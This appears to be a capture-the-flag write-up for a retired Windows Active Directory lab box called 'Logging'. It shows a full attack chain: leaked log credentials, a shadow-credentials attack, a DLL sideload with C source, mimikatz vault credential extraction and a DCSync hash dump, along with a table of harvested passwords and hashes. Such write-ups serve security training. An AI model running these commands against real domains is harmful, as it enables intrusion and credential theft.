# Logging

![OS](https://img.shields.io/badge/OS-Windows-0078D6?style=flat-square&logo=windows&logoColor=white) ![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=flat-square) ![Released](https://img.shields.io/badge/Released-2026--04--18-informational?style=flat-square)

| | |
|---|---|
| **OS** | Windows |
| **Difficulty** | Medium |
| **Release** | April 18, 2026 |
| **Rating** | 4.3 / 5 |
| **Points** | — (retired; no longer awards points) |

## Summary

An SMB-guest-readable log file leaked the `svc_recovery` password — with a year-rollover twist. `svc_recovery` had `GenericWrite` on a gMSA, so a shadow-credentials attack yielded the `msa_health$` NT hash and WinRM access (non-admin). An `UpdateChecker Agent` scheduled task running as `jaylee.clifton` loaded a DLL from a user-writable ZIP, giving code execution as jaylee. jaylee had Administrator's plaintext password stored in her Credential Manager for a scheduled task, extracted with `mimikatz vault::cred /patch`. Both `svc_recovery` and `Administrator` were in **Protected Users**, forcing Kerberos rather than NTLM for every authentication; the final DCSync therefore ran off a Kerberos TGT.

---

## Table of Contents

1. [Enumeration](#enumeration)
2. [Foothold: svc_recovery via SMB log leak](#foothold)
3. [Shadow Credentials → msa_health$](#shadow-credentials)
4. [WinRM & Scheduled Task Recon](#winrm-enum)
5. [DLL Sideload → user.txt](#dll-sideload)
6. [Credential Vault → Administrator password](#credential-vault)
7. [Protected Users Bypass (Kerberos-only)](#protected-users)
8. [DCSync & Root Flag](#dcsync-root)
9. [Lessons Learned](#lessons)

---

## Enumeration <a id="enumeration"></a>

```bash
nmap -p- --min-rate 10000 <TARGET_IP>
```

```
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http          IIS
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (domain: logging.htb)
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap          Active Directory LDAP (logging.htb)
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http
636/tcp  open  ldapssl
3268/tcp open  ldap          Global Catalog
3269/tcp open  ldapssl
5985/tcp open  wsman
8530/tcp open  http          WSUS HTTP
8531/tcp open  http          WSUS HTTPS
9389/tcp open  mc-nmf        ADWS
```

Domain: `logging.htb`, DC hostname: `DC01`, OS: Server 2019 (17763).

SMB null auth enumeration:

```bash
netexec smb <TARGET_IP> -u '' -p '' --shares
```

```
Share           Permissions     Remark
-----           -----------     ------
Logs                            (custom share!)
NETLOGON        READ            Logon server share
SYSVOL          READ            Logon server share
WSUSTemp                        Remote WSUS Console share
```

`Logs` share is custom — enumerate its contents via guest/null bind.

---

## Foothold: svc_recovery via SMB log leak <a id="foothold"></a>

Reading the `Logs` share (SMB → `\\DC01\Logs`):

```bash
smbclient //<TARGET_IP>/Logs -N
```

```
smb: \> ls
  Audit_Heartbeat.log
  IdentitySync_Trace_20260219.log
  Service_State.log
  TaskMonitor.log
```

The trace file has a verbose dump containing a credential:

```
[2026-02-09 03:00:03.125] VERBOSE - ConnectionContext Dump:
 { Domain: "logging.htb", Server: "DC01", SSL: "False",
   BindUser: "LOGGING\svc_recovery", BindPass: "Em3rg3ncyPa$$2025",
   Timeout: 30 }
[2026-02-19 03:00:03.488] ERROR - System.DirectoryServices.Protocols.LdapException:
   LdapErr: ... data 52e ... LDAP_INVALID_CREDENTIALS
```

Notice the **ERROR on Feb 19** — the password `...2025` started failing. It's a **year-rollover password**: rotate `2025` → `2026`.

Verify:

```bash
netexec smb <TARGET_IP> -u svc_recovery -p 'Em3rg3ncyPa$$2026'
```

```
SMB  <TARGET_IP>  445   DC01   [-] logging.htb\svc_recovery:Em3rg3ncyPa$$2026
                                  STATUS_ACCOUNT_RESTRICTION
```

`STATUS_ACCOUNT_RESTRICTION` + LDAP bind uses Kerberos → this is the **Protected Users** group signature. NTLM is blocked but Kerberos works:

```bash
getTGT.py -dc-ip <TARGET_IP> 'logging.htb/svc_recovery:Em3rg3ncyPa$$2026'
# [*] Saving ticket in svc_recovery.ccache
```

Password confirmed. `svc_recovery` can only authenticate via Kerberos.

---

## Shadow Credentials → msa_health$ <a id="shadow-credentials"></a>

BloodHound as `svc_recovery` shows **GenericWrite on `msa_health$`** (group-managed service account). This is the [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ec) attack pattern — write `msDS-KeyCredentialLink` on the target, then PKINIT as them.

### Gotcha: broken impacket import

The system-installed `certipy` failed with:

```
cannot import name 'shadow_credentials' from 'impacket.examples.ntlmrelayx.utils'
```

because the main impacket version doesn't include `shadow_credentials.py`. **Use netexec's pipx venv**, which has a newer impacket:

```bash
~/.local/share/pipx/venvs/netexec/bin/certipy shadow auto \
    -u svc_recovery@logging.htb -k -no-pass \
    -account 'msa_health$' -dc-ip <TARGET_IP> -dc-host dc01.logging.htb
```

```
[*] Successfully added Key Credential with device ID '...'
[*] Got TGT
[*] Trying to retrieve NT hash for 'msa_health$'
[*] Restoring the old Key Credentials for 'msa_health$'
[*] NT hash for 'msa_health$': 603fc24ee01a9409f83c9d1d701485c5
```

`msa_health$` is a member of **Remote Management Users** via the `msDS-GroupMSAMembership` indirection:

```bash
netexec winrm dc01.logging.htb -u 'msa_health$' -H '603fc24ee01a9409f83c9d1d701485c5'
# WINRM  <TARGET_IP>  5985  DC01  [+] logging.htb\msa_health$:603fc24...  (Pwn3d!)
```

(`Pwn3d!` here means WinRM access, **not** local admin.)

---

## WinRM & Scheduled Task Recon <a id="winrm-enum"></a>

As `msa_health$`, enumerate filesystem and tasks via the COM Task Scheduler interface (regular `schtasks` returns Access Denied):

```powershell
$s = New-Object -ComObject "Schedule.Service"
$s.Connect()
$f = $s.GetFolder("\")
foreach ($t in $f.GetTasks(0)) {
  "TASK: $($t.Name) | User: $($t.Definition.Principal.UserId)"
}
# → TASK: UpdateChecker Agent | User: jaylee.clifton
```

Inspect the task:

```
Task To Run: "C:\Program Files\UpdateMonitor\UpdateMonitor.exe" 500 /scan=3 /autofix=true
Run As User: jaylee.clifton
Repeat: Every 3 Minute(s)
```

`msa_health$` can read `C:\Users\msa_health$\Documents\monitor.ps1` (health checker) and reverse-examine `UpdateMonitor.exe` (a small .NET stub). The task flow:

1. Reads `C:\ProgramData\UpdateMonitor\Settings_Update.zip`
2. Extracts to `C:\Program Files\UpdateMonitor\bin\settings_update.dll`
3. `LoadLibrary` + `GetProcAddress("PreUpdateCheck")`, calls the export

Permissions check via `icacls`:

```
C:\ProgramData\UpdateMonitor  BUILTIN\Users:(WD,AD,REA)   ← we CAN write the ZIP
```

---

## DLL Sideload → user.txt <a id="dll-sideload"></a>

Build an **x86** DLL (`UpdateMonitor.exe` is 32-bit .NET) exporting `PreUpdateCheck`. The payload runs as `jaylee.clifton` — copy her `user.txt` to a location `msa_health$` can read.

`settings_update.c`:

```c
#include <windows.h>

DWORD WINAPI Payload(LPVOID p) {
    CopyFileA("C:\\Users\\jaylee.clifton\\Desktop\\user.txt",
              "C:\\ProgramData\\UpdateMonitor\\Logs\\uf.txt", FALSE);
    return 0;
}

__declspec(dllexport) void __stdcall PreUpdateCheck(void) { Payload(NULL); }

BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID l) {
    if (r == DLL_PROCESS_ATTACH) CreateThread(NULL, 0, Payload, NULL, 0, NULL);
    return TRUE;
}
```

Cross-compile with mingw-w64 (Debian's `mingw32` package on Ubuntu provides the 32-bit toolchain):

```bash
i686-w64-mingw32-gcc -shared -o settings_update.dll settings_update.c \
  -Wl,--kill-at -lkernel32 -static-libgcc
zip Settings_Update.zip settings_update.dll
```

### Gotcha: HTB cleanup task

The machine runs a background task that **resets `Settings_Update.zip` every ~30 seconds** back to an original version. A single upload gets reverted before the next 3-minute task fire. Fix: race it with a repeated-upload loop:

```python
# fast_upload.py
import subprocess, time
for i in range(30):
    subprocess.run(["evil-winrm","-i","dc01.logging.htb","-u","msa_health$",
                    "-H","603fc24ee01a9409f83c9d1d701485c5"],
                   input=b"cd C:\\ProgramData\\UpdateMonitor\n"
                         b"upload /path/to/Settings_Update.zip Settings_Update.zip\n"
                         b"exit\n",
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=15)
    time.sleep(8)
```

Run the loop in the background, poll for `uf.txt`, and kill the loop when the file appears:

```bash
netexec winrm dc01.logging.htb -u 'msa_health$' -H '...' \
    -X 'Get-Content C:\ProgramData\UpdateMonitor\Logs\uf.txt'
# → [flag redacted]   user flag
```

---

## Credential Vault → Administrator password <a id="credential-vault"></a>

While enumerating options for root (ADCS templates, WSUS relays, etc. — see [dead ends](#lessons)), the key insight came from inspecting jaylee's stored credentials. Scheduled tasks that run as a user sometimes have a saved password in the Windows Credential Vault; `mimikatz` can list these as the current user without admin rights.

From a jaylee shell (obtained via any of: a DLL that spawns a reverse shell, RunasCs with saved credentials, or dropping a `mimikatz.exe` binary via the DLL and running it):

```
mimikatz # vault::cred /patch

TargetName : Domain:batch=TaskScheduler:Task:{F6E705A7-5122-460D-8164-4E4680BF2361}
UserName   : logging\jaylee.clifton
Credential : wNR*k5OzdtsvD$4WG!

TargetName : Domain:batch=TaskScheduler:Task:{101A93AC-A72F-4723-BE8C-0A5F2B88EB4D}
UserName   : logging\Administrator
Credential : ParolaptController2026#
```

Administrator's cleartext password is stored in the vault for a scheduled task. `/patch` uses `CryptUnprotectData` against the current user's DPAPI master key, which we have as jaylee.

---

## Protected Users Bypass (Kerberos-only) <a id="protected-users"></a>

Trying the password over NTLM:

```bash
netexec smb ... -u Administrator -p 'ParolaptController2026#'
# [-] STATUS_ACCOUNT_RESTRICTION
```

Administrator is in **Protected Users** too (not just `svc_recovery`). NTLM authentication is blocked domain-wide for this account. We must use Kerberos:

```bash
getTGT.py -dc-ip <TARGET_IP> 'logging.htb/Administrator:ParolaptController2026#'
# [*] Saving ticket in Administrator.ccache

export KRB5CCNAME=Administrator.ccache
```

---

## DCSync & Root Flag <a id="dcsync-root"></a>

With Administrator's Kerberos TGT, DCSync works:

```bash
secretsdump.py -k -no-pass -dc-ip <TARGET_IP> \
    logging.htb/Administrator@dc01.logging.htb -just-dc-user Administrator
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a0c1d1bed9126632f5f1f2b3f790bdb5:::
Administrator:aes256-cts-hmac-sha1-96:1d9e91a43de90331df700b2f780d5b8428f7261481f29220cd02193fe5126130
```

Administrator NT hash: `a0c1d1bed9126632f5f1f2b3f790bdb5`.

Administrator's Desktop is **empty**. Search the filesystem:

```bash
wmiexec.py -k -no-pass -dc-ip <TARGET_IP> \
    logging.htb/Administrator@dc01.logging.htb \
    'where /r C:\Users root.txt'
# C:\Users\toby.brynleigh\Desktop\root.txt

wmiexec.py -k -no-pass -dc-ip <TARGET_IP> \
    logging.htb/Administrator@dc01.logging.htb \
    'type C:\Users\toby.brynleigh\Desktop\root.txt'
# → [flag redacted]   root flag
```

Root flag placement is a mild misdirect — an admin's Desktop is the usual location, but here it's in a different user profile.

---

## Lessons Learned <a id="lessons"></a>

### What worked

1. **Read ALL files on the custom `Logs` share**, not just the first few. The `.2025` credential and the `.2026` error were on different days of the trace — you need the most recent entry to realise it's a year rollover.
2. **Shadow Credentials is the default "GenericWrite on target" path** now. Always have a working certipy build.
3. **DLL sideload via scheduled task** is reliable when the service binary calls `LoadLibrary` plus a named export from a user-writable path.
4. **`mimikatz vault::cred`** on a non-admin user when other paths are exhausted — Windows Credential Manager is often full of scheduled-task creds.

### Dead ends explored

- **ADCS UpdateSrv template (ESC1)** — `ENROLLEE_SUPPLIES_SUBJECT` + IT group can enroll → issued a cert for `CN=Administrator` with UPN SAN successfully (`SubmitDisp=3`). But the EKU is **Server Authentication only**; certipy auth fails with `Certificate is not valid for client authentication`. The cert is a red herring.
- **LDAPS Schannel with client cert** — `authMethodNotSupported` (SASL EXTERNAL not enabled).
- **NTLM relay DC01$ → WSUS ApiRemoting30** — coercion succeeded (MS-EFSRPC replies), but the target network rejects outbound SMB to non-privileged ports on our listener (`ERROR_BAD_NETPATH`). Binding port 445 requires root on the attack host, which the lab VPN doesn't grant by default.
- **WSUS client cert auth** — ApiRemoting returns `401 Negotiate/NTLM` regardless of client cert.

### Technical gotchas

- **Year rollover password**: `Em3rg3ncyPa$$2025` → `2026`. Watch trace timestamps against the current year.
- **Protected Users signature**: `STATUS_ACCOUNT_RESTRICTION` on NTLM while Kerberos works = Protected Users. Always try Kerberos first.
- **DLL architecture**: 32-bit .NET stubs need **x86** DLLs (Error 193 = wrong architecture). Cross-compile with `i686-w64-mingw32-gcc`.
- **ZIP cleanup race**: there's a 30-second cleanup task; use a rapid upload loop or time it precisely.
- **Impacket `shadow_credentials`**: use netexec's pipx venv certipy, not the main pip install.
- **Root flag placement**: `C:\Users\toby.brynleigh\Desktop\root.txt`, not Administrator's.

## Credentials Collected

| Principal | Value | How obtained |
|-----------|-------|--------------|
| `wallace.everette` | `Welcome2026@` | Initial recon |
| `svc_recovery` | `Em3rg3ncyPa$$2026` | SMB log leak (year rolled) |
| `msa_health$` NT | `603fc24ee01a9409f83c9d1d701485c5` | Shadow Credentials |
| `jaylee.clifton` | `wNR*k5OzdtsvD$4WG!` | `mimikatz vault::cred` |
| **`Administrator`** password | **`ParolaptController2026#`** | `mimikatz vault::cred` |
| `Administrator` NT | `a0c1d1bed9126632f5f1f2b3f790bdb5` | DCSync |

## References

- [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ec)
- [Protected Users group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [Mimikatz vault::cred](https://github.com/gentilkiwi/mimikatz/wiki/module-~-vault)
- [ADCS ESC1 and domain escalation](https://posts.specterops.io/certified-pre-owned-d95910965cd2) (a red herring here)

**Time from release to root**: ~4 hours (release 19:00 UTC, rooted ~23:10 UTC).

---

*Retired machine. Flag values are deliberately omitted — see the [repository README](../../README.md#ethics-and-policy).*
